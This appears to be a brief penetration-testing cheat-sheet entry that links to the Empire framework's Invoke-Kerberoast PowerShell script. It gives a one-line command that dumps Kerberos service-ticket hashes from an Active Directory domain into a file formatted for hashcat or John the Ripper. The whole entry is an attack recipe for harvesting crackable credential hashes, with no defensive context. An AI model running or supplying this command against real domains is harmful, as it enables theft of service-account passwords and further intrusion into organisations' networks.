### source
https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1  

### kerberoast
```
Invoke-Kerberoast -OutputFormat <[hashcat|john]> | % { $_.Hash } | Out-File -Encoding utf8 <file>
```

